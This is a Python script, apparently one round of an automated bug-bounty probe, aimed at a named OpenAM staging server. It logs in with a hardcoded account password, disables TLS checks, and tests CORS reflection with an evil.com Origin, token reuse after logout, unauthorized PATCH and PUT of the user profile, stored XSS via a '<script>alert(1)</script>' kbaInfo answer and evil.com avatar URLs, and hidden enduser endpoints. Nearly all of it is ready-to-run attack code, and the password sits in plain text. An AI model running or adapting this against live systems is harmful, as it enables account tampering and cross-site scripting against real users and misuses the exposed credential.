# -*- coding: utf-8 -*-
"""AIC 第五十三轮:最后一轮低危候选——CORS / logout 失效 / PATCH / avatar XSS /
enduser/managed
本轮:
A. CORS:OPTIONS+Origin 变体,检查 Access-Control-Allow-Origin(任意 origin=漏洞)
B. logout 后旧 SSO token 是否仍有效(会话失效验证)
C. PATCH users(部分更新,权限可能不同)
D. avatar/photo/iplanet-am-user-avatar 等字段 PUT(存储 XSS)
E. /enduser/managed/ 端点
预期结果表:
  成立 -> ACAO 反射/任意 origin;logout 后 token 仍 200;PATCH 成功;avatar XSS;
"""
import requests, urllib3, json, time
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'
FORM = {'Content-Type': 'application/x-www-form-urlencoded'}

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = r2.json().get('tokenId')
S.headers.update({'Cookie': 'aa942d46ece12ce=' + tok,
                  'Accept-API-Version': 'resource=2.1, protocol=1.0'})
print('LOGIN OK, token:', tok[:25], '...')

U = BASE + '/am/json/realms/root/realms/alpha/users/' + MY_ID

print('\n=== A. CORS 检查 ===')
for origin in ['https://evil.com', 'https://openam-bug-bounty-stag.forgeblocks.com', 'null']:
    r = S.options(U, headers={'Origin': origin,
                              'Access-Control-Request-Method': 'PUT',
                              'Access-Control-Request-Headers': 'content-type'},
                  timeout=12, verify=False)
    acao = r.headers.get('Access-Control-Allow-Origin', 'NONE')
    print('Origin=%-45s -> %d ACAO=%s ACAC=%s' % (
        origin, r.status_code, acao,
        r.headers.get('Access-Control-Allow-Credentials', 'NONE')))
    time.sleep(0.3)
r = S.get(U, headers={'Origin': 'https://evil.com'}, timeout=12, verify=False)
print('GET+Origin=evil -> %d ACAO=%s' % (r.status_code,
      r.headers.get('Access-Control-Allow-Origin', 'NONE')))

print('\n=== B. logout 后 token 失效 ===')
r = S.get(U, timeout=12, verify=False)
print('logout 前 GET users -> %d' % r.status_code)
S.post(BASE + '/am/json/realms/alpha/sessions?_action=logout', json={}, timeout=12, verify=False)
r2 = S.get(U, timeout=12, verify=False)
print('logout 后 GET users -> %d %s' % (r2.status_code, r2.text[:100].replace('\n', ' ')))

print('\n=== C. PATCH users ===')
r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = r2.json().get('tokenId')
S.headers.update({'Cookie': 'aa942d46ece12ce=' + tok})
for body in [{'telephoneNumber': ['555666777']},
             [{'operation': 'replace', 'field': 'telephoneNumber', 'value': ['555666777']}]]:
    try:
        r = S.patch(U, json=body, timeout=12, verify=False)
        print('PATCH %-50s -> %d %s' % (str(body)[:50], r.status_code, r.text[:120].replace('\n', ' ')))
    except Exception as e:
        print('PATCH -> ERR %s' % str(e)[:60])
    time.sleep(0.3)

print('\n=== D. avatar/photo 字段 ===')
for f, v in [('avatar', ['https://evil.com/x.png']),
             ('photo', ['https://evil.com/x.png']),
             ('iplanet-am-user-avatar', ['https://evil.com/x.png']),
             ('kbaInfo', [{'questionId': '1', 'answer': '<script>alert(1)</script>'}])]:
    try:
        r = S.put(U, json={f: v}, timeout=12, verify=False)
        print('PUT %-30s -> %d %s' % (f, r.status_code, r.text[:100].replace('\n', ' ')))
        if r.status_code == 200:
            r2 = S.get(U, timeout=12, verify=False)
            print('   回显含%s: %s' % (f, ('<script>' in r2.text) if '<script>' in v else f in r2.text))
            S.put(U, json={f: ''}, timeout=12, verify=False)
    except Exception as e:
        print('PUT %-30s -> ERR %s' % (f, str(e)[:60]))
    time.sleep(0.3)

print('\n=== E. /enduser/managed/ ===')
for p in ['/enduser/managed/', '/enduser/managed/users', '/enduser/managed/users/' + MY_ID,
          '/enduser/managed/user/' + MY_ID, '/enduser/api/', '/enduser/api/users/' + MY_ID]:
    try:
        r = S.get(BASE + p, timeout=12, verify=False)
        print('%-50s -> %d %s' % (p, r.status_code, r.text[:110].replace('\n', ' ')))
    except Exception as e:
        print('%-50s -> ERR %s' % (p, str(e)[:50]))
    time.sleep(0.3)
